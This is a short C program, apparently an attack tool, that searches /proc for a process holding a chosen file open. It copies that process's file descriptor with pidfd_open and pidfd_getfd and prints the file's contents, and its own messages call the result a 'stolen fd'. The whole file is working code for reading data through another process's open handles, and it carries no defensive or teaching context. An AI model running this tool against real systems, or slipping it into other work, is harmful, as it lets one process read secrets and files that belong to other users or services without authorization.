#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>

#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

static int pidfd_open(pid_t pid, unsigned int flags)
{
    return (int)syscall(SYS_pidfd_open, pid, flags);
}

static int pidfd_getfd(int pidfd, int targetfd, unsigned int flags)
{
    return (int)syscall(SYS_pidfd_getfd, pidfd, targetfd, flags);
}

static int find_fd_for_path(pid_t pid, const char *want_path)
{
    char dir[64];
    snprintf(dir, sizeof(dir), "/proc/%d/fd", pid);

    DIR *d = opendir(dir);
    if (!d) return -1;

    struct dirent *de;
    int found = -1;
    while ((de = readdir(d))) {
        if (de->d_name[0] == '.') continue;

        char link[320], target[512];
        snprintf(link, sizeof(link), "/proc/%d/fd/%s", pid, de->d_name);
        ssize_t n = readlink(link, target, sizeof(target) - 1);
        if (n < 0) continue;
        target[n] = '\0';

        if (strcmp(target, want_path) == 0) {
            found = atoi(de->d_name);
            break;
        }
    }
    closedir(d);
    return found;
}

static int find_proc_with_file(const char *want_path, pid_t *out_pid, int *out_fd)
{
    DIR *proc = opendir("/proc");
    if (!proc) return -1;

    struct dirent *de;
    while ((de = readdir(proc))) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        pid_t pid = (pid_t)atoi(de->d_name);
        int fd = find_fd_for_path(pid, want_path);
        if (fd >= 0) {
            *out_pid = pid;
            *out_fd  = fd;
            closedir(proc);
            return 0;
        }
    }
    closedir(proc);
    return -1;
}

static void drain_fd(int fd)
{
    if (lseek(fd, 0, SEEK_SET) < 0) {

    }
    char buf[65536];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        fwrite(buf, 1, (size_t)n, stdout);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    const char *want = argv[1];
    pid_t target_pid;
    int   target_fd;

    if (argc >= 4) {
        target_pid = (pid_t)atoi(argv[2]);
        target_fd  = atoi(argv[3]);
    } else {
        fprintf(stderr, "[*] scanning /proc for a process with %s open...\n", want);
        if (find_proc_with_file(want, &target_pid, &target_fd) < 0) {
            fprintf(stderr, "[-] no process found with that file open\n");
            return 1;
        }
        fprintf(stderr, "[*] found pid=%d fd=%d\n", target_pid, target_fd);
    }

    int pidfd = pidfd_open(target_pid, 0);
    if (pidfd < 0) {
        perror("pidfd_open");
        return 1;
    }

    int stolen = pidfd_getfd(pidfd, target_fd, 0);
    close(pidfd);
    if (stolen < 0) {
        perror("pidfd_getfd");
        return 1;
    }

    fprintf(stderr, "[*] stolen fd=%d -> local fd=%d\n", target_fd, stolen);
    drain_fd(stolen);
    close(stolen);
    return 0;
}
